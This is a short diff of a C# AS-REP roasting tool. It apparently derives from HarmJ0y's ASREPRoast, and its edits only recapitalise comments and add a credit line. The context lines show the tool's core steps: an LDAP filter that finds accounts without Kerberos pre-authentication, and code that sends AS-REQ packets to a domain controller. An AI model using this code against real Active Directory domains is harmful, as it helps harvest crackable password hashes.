@@ -52,7 +52,7 @@ namespace ASREP_Roasting
             Console.WriteLine("Sending AS-REQ for {0}", userName);
             socket.Send(asreq.RawBytes);
 
-            // retrieve AS-REP
+            // Retrieve AS-REP
             byte[] responseBuffer = new byte[2048];
             int readBytes = socket.Receive(responseBuffer);
 
@@ -71,7 +71,7 @@ namespace ASREP_Roasting
 
             DirectorySearcher asrepSearcher = new DirectorySearcher(directoryEntry);
 
-            // return only user accounts that have the 23rd bit in the UAC value set to true (the "Do not require Pre-Auth" btit)
+            // Return only user accounts that have the 23rd bit in the UAC value set to true (the "Do not require Pre-Auth" btit)
             asrepSearcher.Filter = "(&(sAMAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304))";
             SearchResultCollection users = asrepSearcher.FindAll();
 
@@ -150,7 +150,7 @@ namespace ASREP_Roasting
             {
                 try
                 {
-                    // if no DC IP is supplied, try to resolve the DNS name to retrieve a usbale IPv4 address
+                    // If no DC IP is supplied, try to resolve the DNS name to retrieve a usbale IPv4 address
                     dcip = Dns.GetHostAddresses(domain).First(i => i.AddressFamily == AddressFamily.InterNetwork).ToString();
                 }
                 catch (Exception ex)
@@ -170,7 +170,7 @@ namespace ASREP_Roasting
 
         public ASREQ(string userName, string domain)
         {
-            // https://github.com/HarmJ0y/ASREPRoast/blob/master/ASREPRoast.ps1
+            // https://github.com/HarmJ0y/ASREPRoast/blob/master/ASREPRoast.ps1 - Credit
 
             //-----
             // AS-REQ Header
